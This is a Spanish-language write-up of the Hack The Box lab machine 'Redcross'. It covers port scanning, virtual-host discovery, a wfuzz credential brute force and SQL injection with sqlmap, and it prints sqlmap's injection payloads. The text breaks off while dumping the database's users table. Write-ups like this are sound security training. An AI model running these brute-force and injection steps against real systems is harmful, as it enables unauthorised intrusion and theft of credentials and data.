---
title: "HTB write-up: Redcross"
date: 2019-04-14T00:56:34-05:00
description: "Redcross: A HTB machine that show you how changing values of a DB, can leverage to a privesc"
tags: ["hackthebox", "htb", "boot2root", "pentesting", "sudoers", "RCE"]
categories: ["htb", "pentesting"]

---

RedCross fue una maquina que personalmente después de resolverla no me gusto mucho. Pero no fue hasta que realice el write-up que me di cuenta que es bastante realista al inicio, porque efectúa algunas técnicas para evitar el uso de herramientas automatizadas como sqlmap y nmap, las vulnerabilidades hacia el privesc son de diseño.

<!--more-->

# Machine info
La información que tenemos de la máquina es:

| Name | Maker | OS  | IP Address |
| ---- | ----- | --- | ---------- |
| ![redcross image](https://www.hackthebox.eu/storage/avatars/6c735b462ef58f59d3561966d31f7e48_thumb.png) [redcross](https://www.hackthebox.eu/home/machines/profile/162) | [ompamo](https://www.hackthebox.eu/home/users/profile/9631) | Linux | 10.10.10.113 |

Su tarjeta de presentación es:

![cardinfo](/img/htb-redcross/cardinfo.png)


# Port Scanning

Iniciamos por ejecutar un `nmap` y un `masscan` para identificar puertos udp y tcp abiertos:

``` text
root@laptop:~# nmap -sS -p- -n --open -v 10.10.10.113
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-17 16:47 CST
Initiating Ping Scan at 19:04
Scanning 10.10.10.113 [4 ports]
Completed Ping Scan at 19:04, 0.22s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:04
Scanning 10.10.10.113 [65535 ports]
Discovered open port 80/tcp on 10.10.10.113
Discovered open port 443/tcp on 10.10.10.113
Discovered open port 22/tcp on 10.10.10.113
Increasing send delay for 10.10.10.113 from 0 to 5 due to 11 out of 29 dropped probes since last increase.
SYN Stealth Scan Timing: About 3.31% done; ETC: 16:54 (0:15:05 remaining)
Increasing send delay for 10.10.10.113 from 5 to 10 due to 11 out of 22 dropped probes since last increase.
Increasing send delay for 10.10.10.113 from 10 to 20 due to 11 out of 24 dropped probes since last increase.
SYN Stealth Scan Timing: About 3.94% done; ETC: 17:04 (0:24:46 remaining)
Increasing send delay for 10.10.10.113 from 20 to 40 due to 11 out of 23 dropped probes since last increase.
SYN Stealth Scan Timing: About 4.34% done; ETC: 17:14 (0:33:24 remaining)
Increasing send delay for 10.10.10.113 from 40 to 80 due to 11 out of 25 dropped probes since last increase.
Increasing send delay for 10.10.10.113 from 80 to 160 due to 11 out of 23 dropped probes since last increase.
SYN Stealth Scan Timing: About 4.56% done; ETC: 17:23 (0:42:11 remaining)
Increasing send delay for 10.10.10.113 from 160 to 320 due to 11 out of 26 dropped probes since last increase.
SYN Stealth Scan Timing: About 4.66% done; ETC: 17:33 (0:51:29 remaining)
SYN Stealth Scan Timing: About 4.72% done; ETC: 17:43 (1:00:50 remaining)
SYN Stealth Scan Timing: About 4.79% done; ETC: 17:52 (1:09:54 remaining)
SYN Stealth Scan Timing: About 4.86% done; ETC: 18:01 (1:18:43 remaining)
...
FOREVER
```

- `-sS` para escaneo TCP vía SYN
- `-p-` para todos los puertos TCP
- `--open` para que solo me muestre resultados de puertos abiertos
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*

Como pudimos ver con `nmap`, el escaneo demoraba mucho e incrementaba el tiempo de envío conforme encontraba drops. Podemos obtener un mejor resultado si agregamos `--max-retries 1 --max-scan-delay 1000ms`, para limitar un reintento por prueba y un segundo de tiempo de espera por prueba.

Por el momento, tomemos como referencia los resultados, los 3 primeros puertos descubiertos, y continuemos con el doblecheck usando `masscan`:

``` text
root@laptop:~# masscan -e tun0 -p0-65535,U:0-65535 --rate 500 10.10.10.113

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-18 01:15:51 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131072 ports/host]
Discovered open port 22/tcp on 10.10.10.113
Discovered open port 443/tcp on 10.10.10.113
Discovered open port 80/tcp on 10.10.10.113
```

- `-e tun0` para ejecutarlo nada mas en la interface tun0
- `-p0-65535,U:0-65535` TODOS los puertos (TCP y UDP)
- `--rate 500` para mandar 500pps y no sobre cargar la VPN ):

Como podemos ver los puertos son los mismos, por lo que iniciamos por identificar los servicios nuevamente con `nmap`.

# Services Identification

Lanzamos `nmap` con los parámetros habituales para la identificación (\-sC \-sV) y le sumamos un timeout a los scripts NSE de 10:

``` text
root@laptop:~# nmap -sC -sV -p22,80,443 -n -v 10.10.10.113 --script-timeout 10
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-17 18:31 CDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:31
Completed NSE at 18:31, 0.00s elapsed
Initiating NSE at 18:31
Completed NSE at 18:31, 0.00s elapsed
Initiating Ping Scan at 18:31
Scanning 10.10.10.113 [4 ports]
Completed Ping Scan at 18:31, 0.23s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 18:31
Scanning 10.10.10.113 [3 ports]
Discovered open port 22/tcp on 10.10.10.113
Discovered open port 443/tcp on 10.10.10.113
Discovered open port 80/tcp on 10.10.10.113
Completed SYN Stealth Scan at 18:31, 0.22s elapsed (3 total ports)
Initiating Service scan at 18:31
Scanning 3 services on 10.10.10.113
Completed Service scan at 18:31, 12.90s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.113.
Initiating NSE at 18:31
Completed NSE at 18:31, 10.31s elapsed
Initiating NSE at 18:31
Completed NSE at 18:31, 0.01s elapsed
Nmap scan report for 10.10.10.113
Host is up (0.11s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey:
|   2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA)
|   256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA)
|_  256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519)
80/tcp  open  http     Apache httpd 2.4.25
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to https://intra.redcross.htb/
443/tcp open  ssl/http Apache httpd 2.4.25
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to https://intra.redcross.htb/
| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
| Issuer: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-06-03T19:46:58
| Not valid after:  2021-02-27T19:46:58
| MD5:   f95b 6897 247d ca2f 3da7 6756 1046 16f1
|_SHA-1: e86e e827 6ddd b483 7f86 c59b 2995 002c 77cc fcea
|_ssl-date: TLS randomness does not represent time
Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 18:31
Completed NSE at 18:31, 0.00s elapsed
Initiating NSE at 18:31
Completed NSE at 18:31, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.28 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
```

- `-sC` para que ejecute los scripts safe-discovery de nse
- `-sV` para que me traiga el banner del puerto
- `-p22,80,443` para unicamente los puertos TCP/22, TCP/80 y TCP/443
- `-n` para no ejecutar resoluciones
- `-v` para modo *verboso*
- `--nse-timeout 10` para limitar las pruebas de tiempo y no perdernos en el delay a nivel de script como antes con scan.

Como podemos ver, tenemos 2 servicios HTTP (TCP/80) y HTTPS (TCP/443) haciendo referencia a un host intra.redcross.htb, y un servicio de SSH expuesto. Por las versiones de APACHE y OpenSSH no encontramos exploits directos, por lo que pasemos a analizar los servicios.

# Explorando el servicio HTTP (TCP/80)

Comenzamos por explorar el servicio web sobre el puerto TCP/80:

``` html
xbytemx@laptop:~/htb/redcross$ http 10.10.10.113
HTTP/1.1 301 Moved Permanently
Connection: Keep-Alive
Content-Length: 313
Content-Type: text/html; charset=iso-8859-1
Date: Mon, 18 Mar 2019 01:12:38 GMT
Keep-Alive: timeout=5, max=100
Location: https://intra.redcross.htb/
Server: Apache/2.4.25 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="https://intra.redcross.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at 10.10.10.113 Port 80</address>
</body></html>
```

Lo primero que recibimos es un código 301 que nos redirige hacia `intra.redcross.htb` indicándonos la existencia de posibles vhosts sobre el servidor. Importante que también cambiamos de http (tcp/80) a https (tcp/443), pero de momento no ajustemos el protocolo y agreguemos el header de Host.

Hagamos la prueba sobre intra.redcross.htb:

``` html
xbytemx@laptop:~/htb/redcross$ http 10.10.10.113 Host:intra.redcross.htb
HTTP/1.1 301 Moved Permanently
Connection: Keep-Alive
Content-Length: 319
Content-Type: text/html; charset=iso-8859-1
Date: Mon, 18 Mar 2019 01:12:55 GMT
Keep-Alive: timeout=5, max=100
Location: https://intra.redcross.htb/
Server: Apache/2.4.25 (Debian)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="https://intra.redcross.htb/">here</a>.</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at intra.redcross.htb Port 80</address>
</body></html>
```

Observamos que al ingresar correctamente el vhost, tenemos una redirección hacia https:

Sigamos esta redirección:

``` html
xbytemx@laptop:~/htb/redcross$ http --verify no https://10.10.10.113 Host:intra.redcross.htb
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Length: 463
Content-Type: text/html; charset=UTF-8
Date: Mon, 18 Mar 2019 01:13:13 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Location: /?page=login
Pragma: no-cache
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=aa8a92c5mkbstk7b3t01qt37o5; path=/

<a href=/><table border=0 width=90%><tr><td colspan=2><table border=0><tr><td rowspan=2 align='right'><img src='/images/logo.png' width='50%'></td><td valign='bottom'><h2>RedCross Messaging Intranet</h2></td></tr><tr><td valign='top'><h3>Employees & providers portal</h3></td></tr></table></td><td><p style='font-size:75%'>not logged in</p><form action='/?page=login' method='POST'><input type='submit' name='action' value='go login'></form></td></tr></table></a>
```

Tenemos ahora un *302*, un `location` de `/?page=login` y un portal de ingreso para empleados "intranet". Hamos un request en esta pagina:

``` text
xbytemx@laptop:~/htb/redcross$ http --verify no https://10.10.10.113/?page=login Host:intra.redcross.htb
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 485
Content-Type: text/html; charset=UTF-8
Date: Mon, 18 Mar 2019 01:13:45 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=snmneeed8pfkdpsv3icgknd5v7; path=/
Vary: Accept-Encoding

<a href=/><table border=0 width=90%><tr><td colspan=2><table border=0><tr><td rowspan=2 align='right'><img src='/images/logo.png' width='50%'></td><td valign='bottom'><h2>RedCross Messaging Intranet</h2></td></tr><tr><td valign='top'><h3>Employees & providers portal</h3></td></tr></table></td><td><p style='font-size:75%'>not logged in</p><form action='/?page=login' method='POST'><input type='submit' name='action' value='go login'></form></td></tr></table></a><center><table><form method='POST' action='/pages/actions.php'><tr><td align='right'>User</td><td><input type='text' name='user'></input></td></tr><tr><td align='right'>Password</td><td><input type='password' name='pass'></input></td></tr><tr><td colspan=2 align='right'><input type='submit' value='Login'></td></tr></table><input type='hidden' name='action' value='login'></form><p>Please contact with our staff via <a href='?page=contact'>contact form</a> to request your access credentials.</p></center><br><br><center><p>Web messaging system 0.3b</p></center>
```

![intra root](/img/htb-redcross/http-intra-root.png)

Agregaremos el fqdn 'intra.redcross.htb' en nuestro archivo /etc/hosts.

Podemos ver que tenemos un form hacia `/pages/actions.php` que recibe el user, pass y action. Mandemos una prueba via POST con las credenciales tradicionales de admin/admin:

``` html
xbytemx@laptop:~/htb/redcross$ http --verify no -f POST "https://intra.redcross.htb/pages/actions.php" user=admin pass=admin submit=Login action=login
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Length: 11
Content-Type: text/html; charset=UTF-8
Date: Tue, 19 Mar 2019 04:26:36 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=v8fdc8aspa898iharh9t2occ27; path=/
refresh: 3;url=/

Wrong data!
```

Vemos que nos arroja el mensaje de error de `Wrong data!`, esto lo podemos meter a `wfuzz` para realizar un ataque de fuerza bruta a las credenciales de acceso:

``` text
xbytemx@laptop:~/htb/redcross$ wfuzz -c --hh 11 -z file,/home/xbytemx/git/SecLists/Usernames/top-usernames-shortlist.txt -z file,/home/xbytemx/git/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt -d 'user=FUZZ&pass=FUZ2Z&submit=Login&action=login' https://intra.redcross.htb/pages/actions.php

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: https://intra.redcross.htb/pages/actions.php
Total requests: 8483

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000039:  C=200      0 L	       2 W	     11 Ch	  "root - 1234567"
Fatal exception: Pycurl error 7: Failed to connect to intra.redcross.htb port 443: Connection refused
```

- `-c` para agregar colores a la salida
- `--hh 11` para indicarle que mensajes ocultar, basado en la longitud de 11 caracteres
- `-z file,usernames` para la lista de posibles usuarios
- `-z file,passwords` para la lista de posibles contraseñas
- `-d user=FUZZ&pass=FUZ2Z&submit=Login&action=login` para el data del form donde insertamos los valores del diccionario.

Como podemos ver después de un par de intentos (39), el servidor empieza a rechazar las conexiones.

Reduciendo la prueba a valores idénticos (mismo nombre y contraseña), logre adivinar una cuenta para acceder:

``` text
xbytemx@laptop:~/htb/redcross$ wfuzz -c --hh 11 -z file,/home/xbytemx/git/SecLists/Usernames/top-usernames-shortlist.txt -d 'user=FUZZ&pass=FUZZ&submit=Login&action=login' https://intra.redcross.htb/pages/actions.php

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: https://intra.redcross.htb/pages/actions.php
Total requests: 17

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000004:  C=200      0 L	       3 W	     32 Ch	  "guest"

Total time: 1.621467
Processed Requests: 17
Filtered Requests: 16
Requests/sec.: 10.48433
```

> creds: guest / guest

Ya tenemos unas credenciales validas para intra.redcross.htb.

# Searching for anothers subdomains

Como recodaremos, al realizar una petición directamente al servidor, nos mando hacia intra, pero ¿y si existen mas vhosts?

Probemos con vhostscan:

``` text
(VHostScan-loWTcTIQ) xbytemx@laptop:~/git/VHostScan$ VHostScan -t intra.redcross.htb -b redcross.htb -p 443 --ssl
+-+-+-+-+-+-+-+-+-+  v. 1.21
|V|H|o|s|t|S|c|a|n|  Developed by @codingo_ & @__timk
+-+-+-+-+-+-+-+-+-+  https://github.com/codingo/VHostScan

[+] Starting virtual host scan for intra.redcross.htb using port 443 and wordlists: /home/xbytemx/.cache/Python-Eggs/VHostScan-1.21-py2.7.egg-tmp/VHostScan/wordlists/virtual-host-scanning.txt
[>] SSL flag set, sending all results over HTTPS.
[>] Ignoring HTTP codes: 404
[+] Resolving DNS for additional wordlist entries
[!] Couldn't find any records (NXDOMAIN)
[#] Found: admin.redcross.htb (code: 200, length: 401, hash: d4c1c1cfc88ca212c152ad914a94d6ca3bcc9565d93ea934a3d999ed887a64c3)
  Date: Mon, 18 Mar 2019 01:40:58 GMT
  Server: Apache/2.4.25 (Debian)
  Expires: Thu, 19 Nov 1981 08:52:00 GMT
  Cache-Control: no-store, no-cache, must-revalidate
  Pragma: no-cache
  Vary: Accept-Encoding
  Content-Encoding: gzip
  Content-Length: 401
  Keep-Alive: timeout=5, max=99
  Connection: Keep-Alive
  Content-Type: text/html; charset=UTF-8


[+] Most likely matches with a unique count of 1 or less:
	[>] admin.redcross.htb
(VHostScan-loWTcTIQ) xbytemx@laptop:~/git/VHostScan$
```

- `-t intra.redcross.htb` para indicar el target vhost que si conocemos.
- `-b redcross.htb` para indicar el dominio raiz
- `-p 443 --ssl` para indicar que estaremos buscando sobre HTTPS

Hemos encontrado otro vhosts, en este caso se trata de `admin.redcross.htb`, el cual agregamos tambien a nuestro archivo `/etc/hosts`:

``` html
xbytemx@laptop:~/htb/redcross$ http --verify no "https://admin.redcross.htb"
HTTP/1.1 302 Found
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Length: 363
Content-Type: text/html; charset=UTF-8
Date: Sun, 14 Apr 2019 07:45:59 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Location: /?page=login
Pragma: no-cache
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=1ec3ba5cg3i5rhmif3ii0foa30; path=/

<center><a href=/><table border=0 width=95%><tr><td><table border=0><tr><td width=10% rowspan=2><img src='/images/it.svg' width='100%'></td><td valign='bottom'><h2>IT Admin panel</h2></td></tr><tr><td valign='top'><h3>Authorized personnel only</h3></td></tr></table></td><td width=100px><p style='font-size:75%'>[[please login]]</p></td></tr></table></a></center>
```

![admin root](/img/htb-redcross/http-admin-root.png)

Necesitamos nuevamente algunas credenciales, pero vemos una estructura muy familiar (Location: `/?page=login`).

# Login on intra

Ahora que hemos identificado unas credenciales para intra, validemos el acceso:

``` text
xbytemx@laptop:~/htb/redcross$ http --verify no -f POST "https://intra.redcross.htb/pages/actions.php" user=guest pass=guest action=login action=login
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Length: 32
Content-Type: text/html; charset=UTF-8
Date: Tue, 19 Mar 2019 05:09:59 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.25 (Debian)
Set-Cookie: PHPSESSID=le7n8htqei4pg268v1bm1vqtq1; path=/
Set-Cookie: LANG=EN_US; expires=Mon, 17-Jun-2019 05:10:00 GMT; Max-Age=7776000; path=/
Set-Cookie: SINCE=1552972200; expires=Mon, 17-Jun-2019 05:10:00 GMT; Max-Age=7776000; path=/
Set-Cookie: LIMIT=10; expires=Mon, 17-Jun-2019 05:10:00 GMT; Max-Age=7776000; path=/
Set-Cookie: DOMAIN=intra; expires=Mon, 17-Jun-2019 05:10:00 GMT; Max-Age=7776000; path=/
refresh: 3;url=/

Checking provided credentials...

```

Siguiendo el redirect que se genera después, tendremos una pantalla como la siguiente:

![intra login](/img/htb-redcross/http-intra-login.png)

``` text
xbytemx@laptop:~$ http --verify no https://intra.redcross.htb/?page=app "Cookie: PHPSESSID=le7n8htqei4pg268v1bm1vqtq1;LANG=EN_US;SINCE=1552972200;LIMIT=10;DOMAIN=intra;"
HTTP/1.1 200 OK
Cache-Control: no-store, no-cache, must-revalidate
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 595
Content-Type: text/html; charset=UTF-8
Date: Tue, 19 Mar 2019 05:11:20 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Keep-Alive: timeout=5, max=100
Pragma: no-cache
Server: Apache/2.4.25 (Debian)
Vary: Accept-Encoding

<a href=/><table border=0 width=90%><tr><td colspan=2><table border=0><tr><td rowspan=2 align='right'><img src='/images/logo.png' width='50%'></td><td valign='bottom'><h2>RedCross Messaging Intranet</h2></td></tr><tr><td valign='top'><h3>Employees & providers portal</h3></td></tr></table></td><td><p style='font-size:75%'>guest</p><form action='/pages/actions.php' method='POST'><input type='submit' name='action' value='end session'></form></td></tr></table></a><center><table border=0 width=60% cellpadding=5><tr><td colspan=2><h3><b>Guest Account Info [1]</b></h3></td></tr><tr><td>From: admin (uid 1)</td><td align='right'>To: guest (uid 5)</td></tr><tr><td colspan=2><p>You're granted with a low privilege access while we're processing your credentials request. Our messaging system still in beta status. Please report if you find any incidence.</p></td></tr></table></center><center><table border=0 width=60% cellspacing=5><tr><td align=right><form method='GET' action='/'>UserID&nbsp<input type='text' size=1 name='o' >&nbsp<input type='submit' value='filter'><input type=hidden name='page' value='app'></form></td></tr></table></center><br><br><center><p>Web messaging system 0.3b</p></center>
```

# SQLi

Después de explorar un poco el home (app), me di cuenta de la exposición de algunas variables, por lo que intente un sqli con algunos parámetros de evasión usando `sqlmap`:

``` text
xbytemx@laptop:~/htb/redcross$ sqlmap -u "https://intra.redcross.htb/?o=1&page=app" --cookie="PHPSESSID=le7n8htqei4pg268v1bm1vqtq1; LANG=EN_US; SINCE=1552972200; LIMIT=10; DOMAIN=intra;" --tamper=space2comment --random-agent
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.3.2#stable}
|_ -| . [']     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:11:08 /2019-03-18/

[23:11:08] [INFO] loading tamper module 'space2comment'
[23:11:08] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.12) Gecko/20070508 Firefox/1.5.0.12' from file '/usr/share/sqlmap/txt/user-agents.txt'
[23:11:08] [INFO] testing connection to the target URL
[23:11:09] [INFO] testing if the target URL content is stable
[23:11:10] [INFO] target URL content is stable
[23:11:10] [INFO] testing if GET parameter 'o' is dynamic
[23:11:11] [INFO] GET parameter 'o' appears to be dynamic
[23:11:11] [INFO] heuristic (basic) test shows that GET parameter 'o' might be injectable (possible DBMS: 'MySQL')
[23:11:13] [INFO] heuristic (XSS) test shows that GET parameter 'o' might be vulnerable to cross-site scripting (XSS) attacks
[23:11:13] [INFO] testing for SQL injection on GET parameter 'o'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n]
[23:11:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[23:11:45] [WARNING] reflective value(s) found and filtering out
[23:11:52] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[23:11:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[23:12:21] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[23:12:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[23:13:16] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[23:13:36] [INFO] GET parameter 'o' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable (with --string="Web")
[23:13:36] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[23:13:37] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[23:13:37] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[23:13:38] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[23:13:39] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[23:13:39] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[23:13:40] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[23:13:41] [INFO] GET parameter 'o' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable
[23:13:41] [INFO] testing 'MySQL inline queries'
[23:13:41] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[23:13:42] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
[23:13:43] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[23:13:43] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[23:13:44] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[23:13:44] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[23:13:45] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[23:13:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[23:14:18] [INFO] GET parameter 'o' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[23:14:18] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[23:14:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[23:14:32] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[23:14:33] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[23:14:36] [INFO] target URL appears to have 4 columns in query
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]
[23:15:03] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql')
[23:15:16] [INFO] target URL appears to be UNION injectable with 4 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n]
[23:15:44] [INFO] testing 'MySQL UNION query (50) - 21 to 40 columns'
[23:15:57] [INFO] testing 'MySQL UNION query (50) - 41 to 60 columns'
[23:16:09] [INFO] testing 'MySQL UNION query (50) - 61 to 80 columns'
[23:16:22] [INFO] testing 'MySQL UNION query (100) - 81 to 100 columns'
GET parameter 'o' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 379 HTTP(s) requests:
---
Parameter: o (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: o=1') RLIKE (SELECT (CASE WHEN (8600=8600) THEN 1 ELSE 0x28 END)) AND ('enlR'='enlR&page=app

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: o=1') AND (SELECT 8275 FROM(SELECT COUNT(*),CONCAT(0x7162766b71,(SELECT (ELT(8275=8275,1))),0x71766a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('vOvX'='vOvX&page=app

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: o=1') AND SLEEP(5) AND ('YqZg'='YqZg&page=app
---
[23:16:40] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[23:16:40] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0
[23:16:40] [INFO] fetched data logged to text files under '/home/xbytemx/.sqlmap/output/intra.redcross.htb'

[*] ending @ 23:16:40 /2019-03-18/
```

Como pudimos observar, es posible hacer una sqli dentro del servidor, por lo que omitiré la información de estatus centrándome en las salidas de sqlmap:

``` text
xbytemx@laptop:~/htb/redcross$ sqlmap -u "https://intra.redcross.htb/?o=1&page=app" --cookie="PHPSESSID=le7n8htqei4pg268v1bm1vqtq1; LANG=EN_US; SINCE=1552972200; LIMIT=10; DOMAIN=intra;" --tamper=space2comment --random-agent --dbs

[23:19:17] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 9.0 (stretch)
web application technology: Apache 2.4.25
back-end DBMS: MySQL >= 5.0
[23:19:17] [INFO] fetching database names
[23:19:21] [INFO] used SQL query returns 2 entries
[23:19:21] [INFO] retrieved: 'information_schema'
[23:19:22] [INFO] retrieved: 'redcross'
available databases [2]:
[*] information_schema
[*] redcross


xbytemx@laptop:~/htb/redcross$ sqlmap -u "https://intra.redcross.htb/?o=1&page=app" --cookie="PHPSESSID=le7n8htqei4pg268v1bm1vqtq1; LANG=EN_US; SINCE=1552972200; LIMIT=10; DOMAIN=intra;" --tamper=space2comment --random-agent -D redcross --tables

Database: redcross
[3 tables]
+----------+
| messages |
| requests |
| users    |
+----------+


xbytemx@laptop:~/htb/redcross$ sqlmap -u "https://intra.redcross.htb/?o=1&page=app" --cookie="PHPSESSID=le7n8htqei4pg268v1bm1vqtq1; LANG=EN_US; SINCE=1552972200; LIMIT=10; DOMAIN=intra;" --tamper=space2comment --random-agent -D redcross -T users --columns

Database: redcross
Table: users
[5 columns]
+----------+-------------+
| Column   | Type        |
